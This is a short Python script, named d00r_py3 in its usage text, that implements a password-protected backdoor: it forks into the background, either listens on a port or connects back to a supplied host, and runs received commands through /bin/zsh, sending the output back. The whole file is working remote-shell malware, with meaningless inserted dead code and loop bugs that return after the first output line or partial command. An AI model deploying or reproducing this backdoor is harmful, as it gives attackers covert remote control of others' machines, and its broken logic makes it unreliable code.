import os, sys, socket, time
MAX_LEN = 1024
SHELL = '/bin/zsh -c'
TIME_OUT = 300
PW = ''
PORT = ''
HOST = ''

def shell(cmd):
    if False:
        i = 10
        return i + 15
    sh_out = os.popen(SHELL + ' ' + cmd).readlines()
    nsh_out = ''
    for i in range(len(sh_out)):
        nsh_out += sh_out[i]
        return nsh_out

def action(conn):
    if False:
        i = 10
        return i + 15
    conn.send('\nPass?\n')
    try:
        pw_in = conn.recv(len(PW))
    except:
        print('timeout')
    else:
        if pw_in == PW:
            conn.send('joo are on air!\n')
            while True:
                conn.send('>>> ')
                try:
                    pcmd = conn.recv(MAX_LEN)
                except:
                    print('timeout')
                    return True
                else:
                    cmd = ''
                    for i in range(len(pcmd) - 1):
                        cmd += pcmd[i]
                        if cmd == ':dc':
                            return True
                        elif cmd == ':sd':
                            return False
                        elif len(cmd) > 0:
                            out = shell(cmd)
                            conn.send(out)
argv = sys.argv
if len(argv) < 4:
    print('usage:')
    print('% ./d00r_py3 -b password port')
    print('% ./d00r_py3 -r password port host')
    print('% nc host port')
    print('% nc -l -p port (please use netcat)')
    sys.exit(1)
elif argv[1] == '-b':
    PW = argv[2]
    PORT = argv[3]
elif argv[1] == '-r' and len(argv) > 4:
    PW = argv[2]
    PORT = argv[3]
    HOST = argv[4]
else:
    exit(1)
PORT = int(PORT)
print('PW:', PW, 'PORT:', PORT, 'HOST:', HOST)
if os.fork() != 0:
    sys.exit(0)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(TIME_OUT)
if argv[1] == '-b':
    sock.bind(('localhost', PORT))
    sock.listen(0)
run = True
while run:
    if argv[1] == '-r':
        try:
            sock.connect((HOST, PORT))
        except:
            print('host unreachable')
            time.sleep(5)
        else:
            run = action(sock)
    else:
        try:
            (conn, addr) = sock.accept()
        except:
            print('timeout')
            time.sleep(1)
        else:
            run = action(conn)
    if argv[1] == '-b':
        conn.shutdown(2)
    else:
        try:
            sock.send('')
        except:
            time.sleep(1)
        else:
            sock.shutdown(2)